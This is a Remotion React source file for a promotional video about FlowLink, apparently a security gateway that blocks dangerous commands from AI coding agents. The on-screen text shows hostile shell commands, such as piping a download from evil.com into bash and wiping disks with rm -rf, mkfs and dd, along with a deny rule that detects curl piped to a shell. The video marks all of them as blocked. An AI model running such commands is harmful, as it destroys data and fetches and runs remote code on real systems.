import React from "react";
import {
  Sequence,
  useCurrentFrame,
  useVideoConfig,
  interpolate,
  Easing,
  spring,
} from "remotion";
import { FlowLinkLogo } from "./components/FlowLinkLogo";
import { FlowLinkWordmark } from "./components/FlowLinkWordmark";
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Ban,
  Zap,
  FileCode2,
  Bot,
  Cpu,
  Monitor,
  Server,
  FileText,
  OctagonAlert,
  Skull,
  CircleAlert,
  Code2,
  MousePointer2,
  RefreshCw,
  ScrollText,
} from "lucide-react";

// ─── Colors ───
const BG = "#0a0a0a";
const WHITE = "#ffffff";
const GREEN = "#00ff88";
const RED = "#ff4444";
const YELLOW = "#ffaa00";
const TERM_BG = "#1a1a2e";

// ─── Helpers ───
const ease = (t: number) => Easing.bezier(0.25, 0.1, 0.25, 1);

function fadeIn(frame: number, start: number, dur = 15): number {
  return interpolate(frame - start, [0, dur], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
}

function fadeOut(frame: number, end: number, dur = 10): number {
  return interpolate(frame - (end - dur), [0, dur], [1, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
}

function sceneOpacity(frame: number, start: number, end: number): number {
  const fi = fadeIn(frame, start, 8);
  const fo = fadeOut(frame, end, 8);
  return Math.min(fi, fo);
}

// Glowing text shadow helper
function glow(color: string, intensity = 20): string {
  return `0 0 ${intensity}px ${color}80, 0 0 ${intensity * 2}px ${color}40`;
}

// Lucide icon wrapper for Remotion (renders to SVG, accepts size/color/style)
const Icon: React.FC<{
  component: React.FC<{ size?: number; color?: string; style?: React.CSSProperties }>;
  size?: number;
  color?: string;
  style?: React.CSSProperties;
}> = ({ component: Comp, size = 24, color = WHITE, style }) => {
  return <Comp size={size} color={color} style={{ ...style, filter: style?.textShadow ? undefined : undefined }} />;
};

// ─── Scene 1: Hook (0-5s, frames 0-150) ───
const Hook: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();
  const text = "Your AI agents have root access.";
  const charDelay = 3;
  const textStartFrame = 15;
  const visibleChars = Math.min(
    text.length,
    Math.floor((frame - textStartFrame) / charDelay)
  );

  const redTextOpacity = fadeIn(frame, 120, 20);
  const globalFade = sceneOpacity(frame, 0, 150);

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
      }}
    >
      <div
        style={{
          fontFamily: "'SF Mono', 'Fira Code', 'Courier New', monospace",
          fontSize: 64,
          color: WHITE,
          letterSpacing: 2,
          textShadow: glow(WHITE, 10),
          minHeight: 80,
        }}
      >
        {text.substring(0, Math.max(0, visibleChars))}
        {visibleChars < text.length && visibleChars >= 0 && (
          <span style={{ opacity: Math.sin(frame * 0.3) > 0 ? 1 : 0 }}>|</span>
        )}
      </div>
      <div
        style={{
          fontFamily: "'SF Pro Display', 'Inter', 'Helvetica Neue', sans-serif",
          fontSize: 72,
          color: RED,
          marginTop: 30,
          opacity: redTextOpacity,
          textShadow: glow(RED, 30),
          fontWeight: 700,
          letterSpacing: 4,
        }}
      >
        Who's watching?
      </div>
    </div>
  );
};

// ─── Scene 2: Problem (5-15s, frames 150-450) ───
const Problem: React.FC = () => {
  const frame = useCurrentFrame();
  const localFrame = frame;

  const commands = [
    "$ rm -rf /etc/nginx",
    "$ curl evil.com/payload.sh | bash",
    "$ docker run -v /:/host alpine",
    "$ kubectl delete namespace production",
  ];

  const subtitle = "AI coding agents run unchecked on production servers";
  const globalFade = sceneOpacity(frame, 0, 300);

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
        padding: 60,
      }}
    >
      {/* Terminal window */}
      <div
        style={{
          width: 1000,
          backgroundColor: TERM_BG,
          borderRadius: 16,
          border: "1px solid #2a2a4e",
          boxShadow: glow("#2a2a4e", 15),
          overflow: "hidden",
        }}
      >
        {/* Title bar */}
        <div
          style={{
            height: 40,
            backgroundColor: "#12122a",
            display: "flex",
            alignItems: "center",
            paddingLeft: 16,
            gap: 8,
          }}
        >
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#ff5f57" }} />
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#febc2e" }} />
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#28c840" }} />
          <span style={{ color: "#666", fontSize: 13, marginLeft: 16, fontFamily: "monospace" }}>terminal</span>
        </div>
        <div style={{ padding: "24px 32px", fontFamily: "'SF Mono', 'Fira Code', monospace", fontSize: 22 }}>
          {commands.map((cmd, i) => {
            const cmdStart = 20 + i * 55;
            const blockedStart = cmdStart + 30;
            const cmdOpacity = fadeIn(localFrame, cmdStart, 12);
            const blockedOpacity = fadeIn(localFrame, blockedStart, 8);
            const blockedScale = interpolate(blockedOpacity, [0, 1], [1.5, 1], {
              extrapolateRight: "clamp",
            });

            return (
              <div key={i} style={{ marginBottom: 16, display: "flex", alignItems: "center", justifyContent: "space-between", opacity: cmdOpacity }}>
                <span style={{ color: GREEN }}>{cmd}</span>
                <span
                  style={{
                    color: RED,
                    fontWeight: 900,
                    fontSize: 20,
                    letterSpacing: 4,
                    opacity: blockedOpacity,
                    transform: `scale(${blockedScale})`,
                    textShadow: glow(RED, 15),
                    border: `2px solid ${RED}`,
                    padding: "2px 12px",
                    borderRadius: 4,
                  }}
                >
                  BLOCKED
                </span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Counter */}
      <div
        style={{
          position: "absolute",
          top: 60,
          right: 80,
          color: RED,
          fontFamily: "monospace",
          fontSize: 28,
          opacity: fadeIn(localFrame, 60, 15),
          textShadow: glow(RED, 10),
        }}
      >
        {Math.min(4, Math.floor(Math.max(0, localFrame - 50) / 55) + 1)} threats detected
      </div>

      {/* Subtitle */}
      <div
        style={{
          marginTop: 30,
          color: "#888",
          fontSize: 24,
          fontFamily: "'SF Pro Display', sans-serif",
          opacity: fadeIn(localFrame, 250, 20),
        }}
      >
        {subtitle}
      </div>
    </div>
  );
};

// ─── Scene 3: Introduce (15-22s, frames 450-660) ───
const Introduce: React.FC = () => {
  const frame = useCurrentFrame();
  const globalFade = sceneOpacity(frame, 0, 210);

  const shieldScale = interpolate(fadeIn(frame, 10, 25), [0, 1], [0.3, 1], { extrapolateRight: "clamp" });
  const titleOpacity = fadeIn(frame, 35, 15);
  const subtitleOpacity = fadeIn(frame, 55, 15);

  const pillars = [
    { icon: Shield, title: "Shield", desc: "Real-time threat\ndetection & blocking" },
    { icon: Zap, title: "Relay", desc: "Transparent MCP\nproxy layer" },
    { icon: FileCode2, title: "Policy DSL", desc: "Declarative security\nrules in YAML" },
  ];

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
      }}
    >
      <div style={{ transform: `scale(${shieldScale})`, marginBottom: 20 }}>
        <FlowLinkLogo size={100} style={{ filter: "drop-shadow(0 0 20px rgba(59, 130, 246, 0.5))" }} />
      </div>
      <div style={{ opacity: titleOpacity }}>
        <FlowLinkWordmark size={80} style={{ textShadow: glow(WHITE, 8) }} />
      </div>
      <div
        style={{
          fontFamily: "'SF Pro Display', sans-serif",
          fontSize: 32,
          color: "#aaa",
          marginTop: 8,
          opacity: subtitleOpacity,
          letterSpacing: 6,
        }}
      >
        AI AGENT SECURITY GATEWAY
      </div>

      {/* Pillars */}
      <div style={{ display: "flex", gap: 60, marginTop: 60 }}>
        {pillars.map((p, i) => {
          const pStart = 75 + i * 25;
          const pOpacity = fadeIn(frame, pStart, 15);
          const slideX = interpolate(pOpacity, [0, 1], [-80, 0]);
          const IconComp = p.icon;
          return (
            <div
              key={i}
              style={{
                opacity: pOpacity,
                transform: `translateX(${slideX}px)`,
                textAlign: "center",
                width: 220,
              }}
            >
              <div style={{ marginBottom: 8, display: "flex", justifyContent: "center" }}>
                <IconComp size={48} color={GREEN} style={{ filter: `drop-shadow(0 0 8px ${GREEN}60)` }} />
              </div>
              <div style={{ color: WHITE, fontSize: 24, fontWeight: 700, fontFamily: "sans-serif" }}>{p.title}</div>
              <div style={{ color: "#888", fontSize: 16, marginTop: 8, fontFamily: "sans-serif", whiteSpace: "pre-line" }}>{p.desc}</div>
            </div>
          );
        })}
      </div>
    </div>
  );
};

// ─── Scene 4: Shield Demo (22-35s, frames 660-1050) ───
const ShieldDemo: React.FC = () => {
  const frame = useCurrentFrame();
  const globalFade = sceneOpacity(frame, 0, 390);

  const lines = [
    { cmd: "rm -rf /", result: "BLOCK", level: "L1", danger: true },
    { cmd: "mkfs.ext4 /dev/sda1", result: "BLOCK", level: "L1", danger: true },
    { cmd: "dd if=/dev/zero of=/dev/sda", result: "BLOCK", level: "L1", danger: true },
    { cmd: "ls -la", result: "ALLOW", level: "", danger: false },
    { cmd: "git status", result: "ALLOW", level: "", danger: false },
    { cmd: "cargo test", result: "ALLOW", level: "", danger: false },
  ];

  const dangerVisible = Math.min(3, Math.floor(Math.max(0, frame - 20) / 50));

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
      }}
    >
      <div
        style={{
          width: 1100,
          backgroundColor: TERM_BG,
          borderRadius: 16,
          border: "1px solid #2a2a4e",
          boxShadow: glow("#2a2a4e", 12),
          overflow: "hidden",
        }}
      >
        <div
          style={{
            height: 40,
            backgroundColor: "#12122a",
            display: "flex",
            alignItems: "center",
            paddingLeft: 16,
            gap: 8,
          }}
        >
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#ff5f57" }} />
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#febc2e" }} />
          <div style={{ width: 12, height: 12, borderRadius: 6, backgroundColor: "#28c840" }} />
          <span style={{ color: "#666", fontSize: 13, marginLeft: 16, fontFamily: "monospace" }}>flowlink shield analyze</span>
        </div>
        <div style={{ padding: "20px 32px", fontFamily: "'SF Mono', monospace", fontSize: 19 }}>
          <div style={{ color: "#666", marginBottom: 16, opacity: fadeIn(frame, 5, 10) }}>$ flowlink shield analyze</div>
          {lines.map((line, i) => {
            const lineStart = 20 + i * 45;
            const lineOpacity = fadeIn(frame, lineStart, 12);
            const flashColor = line.danger
              ? Math.sin((frame - lineStart) * 0.5) > 0 && (frame - lineStart) < 25
                ? RED
                : "#cc3333"
              : GREEN;

            return (
              <div key={i} style={{ opacity: lineOpacity, marginBottom: 10, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ color: line.danger ? "#ff8888" : GREEN, display: "flex", alignItems: "center", gap: 8 }}>
                  {line.danger
                    ? <OctagonAlert size={20} color={RED} style={{ filter: `drop-shadow(0 0 6px ${RED}80)` }} />
                    : <CheckCircle2 size={20} color={GREEN} style={{ filter: `drop-shadow(0 0 6px ${GREEN}80)` }} />
                  }
                  {line.cmd}
                </span>
                <span style={{ color: flashColor, fontWeight: 700, textShadow: line.danger ? glow(RED, 10) : glow(GREEN, 8), display: "flex", alignItems: "center", gap: 6 }}>
                  {line.danger && <Ban size={18} color={flashColor} />}
                  {line.result} {line.level && `(${line.level})`}
                </span>
              </div>
            );
          })}

          {/* Risk score bar */}
          <div style={{ marginTop: 20, opacity: fadeIn(frame, 300, 15) }}>
            <div style={{ color: "#888", fontSize: 14, marginBottom: 6 }}>THREAT LEVEL</div>
            <div style={{ width: "100%", height: 8, backgroundColor: "#1a1a1a", borderRadius: 4, overflow: "hidden" }}>
              <div
                style={{
                  width: `${interpolate(dangerVisible, [0, 3], [0, 85])}%`,
                  height: "100%",
                  background: `linear-gradient(90deg, ${GREEN}, ${YELLOW}, ${RED})`,
                  borderRadius: 4,
                  boxShadow: glow(RED, 8),
                }}
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// ─── Scene 5: Policy DSL (35-45s, frames 1050-1350) ───
const PolicyDSL: React.FC = () => {
  const frame = useCurrentFrame();
  const globalFade = sceneOpacity(frame, 0, 300);

  const yamlLines = [
    { text: "rules:", color: "#ff79c6", delay: 10 },
    { text: "  - name: block-exfiltration", color: "#8be9fd", delay: 25 },
    { text: "    action: deny", color: "#ff5555", delay: 40 },
    { text: "    conditions:", color: "#ff79c6", delay: 55 },
    { text: '      - CommandRegex: "curl.*\\\\|\\\\s*(ba)?sh"', color: "#f1fa8c", delay: 70 },
    { text: "", color: WHITE, delay: 85 },
    { text: "  - name: approve-sudo", color: "#8be9fd", delay: 85 },
    { text: "    action: ask", color: YELLOW, delay: 100 },
    { text: "    conditions:", color: "#ff79c6", delay: 115 },
    { text: '      - CommandPattern: "sudo *"', color: "#f1fa8c", delay: 130 },
  ];

  const evalLines = [
    { text: "curl http://evil.com/payload | sh", result: "DENY", rule: "block-exfil", color: RED, IconComp: CircleAlert, delay: 180 },
    { text: "sudo apt update", result: "ASK", rule: "approve-sudo", color: YELLOW, IconComp: AlertTriangle, delay: 210 },
    { text: "git status", result: "ALLOW", rule: "", color: GREEN, IconComp: CheckCircle2, delay: 240 },
  ];

  const showEval = frame > 170;

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
      }}
    >
      <div style={{ display: "flex", gap: 40, alignItems: "flex-start" }}>
        {/* YAML */}
        <div
          style={{
            width: 520,
            backgroundColor: "#1e1e2e",
            borderRadius: 12,
            border: "1px solid #333",
            overflow: "hidden",
            opacity: showEval ? interpolate(fadeIn(frame, 160, 15), [0, 1], [1, 0.4]) : 1,
          }}
        >
          <div style={{ height: 36, backgroundColor: "#181828", display: "flex", alignItems: "center", paddingLeft: 12 }}>
            <span style={{ color: "#666", fontSize: 12, fontFamily: "monospace" }}>policy.yaml</span>
          </div>
          <div style={{ padding: "16px 20px", fontFamily: "'SF Mono', monospace", fontSize: 17 }}>
            {yamlLines.map((line, i) => (
              <div key={i} style={{ color: line.color, opacity: fadeIn(frame, line.delay, 10), minHeight: line.text ? 24 : 12 }}>
                {line.text}
              </div>
            ))}
          </div>
        </div>

        {/* Evaluation results */}
        <div
          style={{
            width: 520,
            opacity: fadeIn(frame, 170, 15),
          }}
        >
          <div style={{ marginBottom: 24, color: "#666", fontSize: 14, fontFamily: "monospace", paddingLeft: 8 }}>POLICY EVALUATION</div>
          {evalLines.map((line, i) => {
            const lineOpacity = fadeIn(frame, line.delay, 12);
            const EvalIcon = line.IconComp;
            return (
              <div
                key={i}
                style={{
                  opacity: lineOpacity,
                  backgroundColor: "#1e1e2e",
                  borderRadius: 10,
                  padding: "16px 20px",
                  marginBottom: 12,
                  border: `1px solid ${line.color}30`,
                  fontFamily: "'SF Mono', monospace",
                  fontSize: 17,
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                }}
              >
                <span style={{ color: "#ccc", display: "flex", alignItems: "center", gap: 8 }}>
                  <EvalIcon size={20} color={line.color} style={{ filter: `drop-shadow(0 0 6px ${line.color}80)` }} />
                  {line.text}
                </span>
                <span style={{ color: line.color, fontWeight: 700, textShadow: glow(line.color, 8) }}>
                  → {line.result} {line.rule && `(${line.rule})`}
                </span>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};

// ─── Scene 6: Architecture (45-55s, frames 1350-1650) ───
const Architecture: React.FC = () => {
  const frame = useCurrentFrame();
  const globalFade = sceneOpacity(frame, 0, 300);

  const agents: { name: string; IconComp: React.FC<{ size?: number; color?: string; style?: React.CSSProperties }> }[] = [
    { name: "Claude Code", IconComp: Bot },
    { name: "Cursor", IconComp: MousePointer2 },
    { name: "Codex", IconComp: Code2 },
    { name: "Any Agent", IconComp: Cpu },
  ];
  const relayNodes: { name: string; IconComp: React.FC<{ size?: number; color?: string; style?: React.CSSProperties }> }[] = [
    { name: "FlowLink Relay", IconComp: Zap },
    { name: "Shield", IconComp: ShieldCheck },
    { name: "Audit Log", IconComp: FileText },
  ];
  const rightNodes: { name: string; IconComp: React.FC<{ size?: number; color?: string; style?: React.CSSProperties }> }[] = [
    { name: "FlowLink Agent", IconComp: Monitor },
    { name: "Policy DSL", IconComp: FileCode2 },
    { name: "Approval", IconComp: CheckCircle2 },
  ];

  const agentX = 200;
  const relayX = 700;
  const rightX = 1200;
  const hostX = 1600;
  const topY = 250;

  const connectionOpacity = fadeIn(frame, 60, 20);
  const dotProgress = (frame - 80) / 60;

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        opacity: globalFade,
        position: "relative",
      }}
    >
      {/* Title */}
      <div
        style={{
          position: "absolute",
          top: 60,
          width: "100%",
          textAlign: "center",
          color: WHITE,
          fontSize: 36,
          fontFamily: "'SF Pro Display', sans-serif",
          fontWeight: 700,
          opacity: fadeIn(frame, 10, 15),
          letterSpacing: 2,
        }}
      >
        Architecture
      </div>

      {/* Agents column */}
      {agents.map(({ name, IconComp }, i) => {
        const y = topY + i * 120;
        return (
          <div key={name}>
            <div
              style={{
                position: "absolute",
                left: agentX - 80,
                top: y - 20,
                width: 170,
                height: 44,
                backgroundColor: "#1a1a2e",
                border: "1px solid #444",
                borderRadius: 8,
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                gap: 8,
                color: "#ccc",
                fontSize: 16,
                fontFamily: "'SF Mono', monospace",
                opacity: fadeIn(frame, 15 + i * 10, 12),
              }}
            >
              <IconComp size={18} color="#ccc" />
              {name}
            </div>
            {/* Arrow to relay */}
            <div
              style={{
                position: "absolute",
                left: agentX + 95,
                top: y - 1,
                width: relayX - agentX - 170,
                height: 2,
                backgroundColor: "#333",
                opacity: connectionOpacity,
              }}
            />
            <div
              style={{
                position: "absolute",
                left: agentX + 95 + (relayX - agentX - 170) * ((dotProgress + i * 0.2) % 1),
                top: y - 5,
                width: 10,
                height: 10,
                borderRadius: 5,
                backgroundColor: GREEN,
                boxShadow: glow(GREEN, 10),
                opacity: connectionOpacity * (((dotProgress + i * 0.2) % 1) > 0 ? 1 : 0),
              }}
            />
            <span
              style={{
                position: "absolute",
                left: (agentX + relayX) / 2 - 15,
                top: y - 22,
                color: "#555",
                fontSize: 11,
                fontFamily: "monospace",
                opacity: connectionOpacity,
              }}
            >
              MCP
            </span>
          </div>
        );
      })}

      {/* Relay column */}
      {relayNodes.map(({ name, IconComp }, i) => {
        const y = topY + 40 + i * 120;
        return (
          <div
            key={name}
            style={{
              position: "absolute",
              left: relayX - 75,
              top: y - 20,
              width: 170,
              height: 44,
              backgroundColor: "#1a2e1a",
              border: `1px solid ${GREEN}40`,
              borderRadius: 8,
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              gap: 8,
              color: GREEN,
              fontSize: 16,
              fontFamily: "'SF Mono', monospace",
              opacity: fadeIn(frame, 40 + i * 10, 12),
            }}
          >
            <IconComp size={18} color={GREEN} />
            {name}
          </div>
        );
      })}

      {/* Right column */}
      {rightNodes.map(({ name, IconComp }, i) => {
        const y = topY + 40 + i * 120;
        return (
          <div key={name}>
            <div
              style={{
                position: "absolute",
                left: rightX - 70,
                top: y - 20,
                width: 160,
                height: 44,
                backgroundColor: "#2e1a1a",
                border: `1px solid ${YELLOW}40`,
                borderRadius: 8,
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                gap: 8,
                color: YELLOW,
                fontSize: 16,
                fontFamily: "'SF Mono', monospace",
                opacity: fadeIn(frame, 70 + i * 10, 12),
              }}
            >
              <IconComp size={18} color={YELLOW} />
              {name}
            </div>
            {/* Arrow to host from FlowLink Agent */}
            {i === 0 && (
              <>
                <div
                  style={{
                    position: "absolute",
                    left: rightX + 95,
                    top: y - 1,
                    width: hostX - rightX - 180,
                    height: 2,
                    backgroundColor: "#333",
                    opacity: connectionOpacity,
                  }}
                />
                <div
                  style={{
                    position: "absolute",
                    left: rightX + 95 + (hostX - rightX - 180) * (dotProgress % 1),
                    top: y - 5,
                    width: 10,
                    height: 10,
                    borderRadius: 5,
                    backgroundColor: YELLOW,
                    boxShadow: glow(YELLOW, 10),
                    opacity: connectionOpacity,
                  }}
                />
              </>
            )}
          </div>
        );
      })}

      {/* Host */}
      <div
        style={{
          position: "absolute",
          left: hostX - 80,
          top: topY + 40 - 20,
          width: 140,
          height: 44,
          backgroundColor: "#2e2e1a",
          border: `1px solid ${WHITE}30`,
          borderRadius: 8,
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          gap: 8,
          color: WHITE,
          fontSize: 16,
          fontFamily: "'SF Mono', monospace",
          opacity: fadeIn(frame, 90, 12),
        }}
      >
        <Server size={18} color={WHITE} />
        {`Host`}
      </div>
    </div>
  );
};

// ─── Scene 7: CTA (55-60s, frames 1650-1800) ───
const CTA: React.FC = () => {
  const frame = useCurrentFrame();
  const shieldScale = interpolate(Math.sin(frame * 0.08), [-1, 1], [1, 1.15]);
  const titleOpacity = fadeIn(frame, 10, 20);
  const subtitleOpacity = fadeIn(frame, 30, 20);
  const urlOpacity = fadeIn(frame, 50, 20);

  return (
    <div
      style={{
        width: "100%",
        height: "100%",
        backgroundColor: BG,
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div style={{ position: "relative", transform: `scale(${shieldScale})`, marginBottom: 20 }}>
        <FlowLinkLogo size={80} style={{ filter: "drop-shadow(0 0 20px rgba(59, 130, 246, 0.5))" }} />
        <div style={{ position: "absolute", bottom: -4, right: -4 }}>
          <ShieldCheck size={32} color={GREEN} style={{ filter: `drop-shadow(0 0 10px ${GREEN}80)` }} />
        </div>
      </div>
      <div style={{ opacity: titleOpacity }}>
        <FlowLinkWordmark size={90} style={{ textShadow: glow(WHITE, 12) }} />
      </div>
      <div
        style={{
          fontFamily: "'SF Pro Display', sans-serif",
          fontSize: 36,
          color: "#aaa",
          marginTop: 16,
          opacity: subtitleOpacity,
          letterSpacing: 2,
        }}
      >
        Secure your AI agents
      </div>
      <div
        style={{
          fontFamily: "'SF Mono', monospace",
          fontSize: 28,
          color: GREEN,
          marginTop: 40,
          opacity: urlOpacity,
          textShadow: glow(GREEN, 10),
          letterSpacing: 2,
        }}
      >
        flowlink.flow-masters.ru
      </div>
    </div>
  );
};

// ─── Main Composition ───
export const FlowLinkPromo: React.FC = () => {
  return (
    <>
      <Sequence from={0} durationInFrames={150}>
        <Hook />
      </Sequence>
      <Sequence from={150} durationInFrames={300}>
        <Problem />
      </Sequence>
      <Sequence from={450} durationInFrames={210}>
        <Introduce />
      </Sequence>
      <Sequence from={660} durationInFrames={390}>
        <ShieldDemo />
      </Sequence>
      <Sequence from={1050} durationInFrames={300}>
        <PolicyDSL />
      </Sequence>
      <Sequence from={1350} durationInFrames={300}>
        <Architecture />
      </Sequence>
      <Sequence from={1650} durationInFrames={150}>
        <CTA />
      </Sequence>
    </>
  );
};
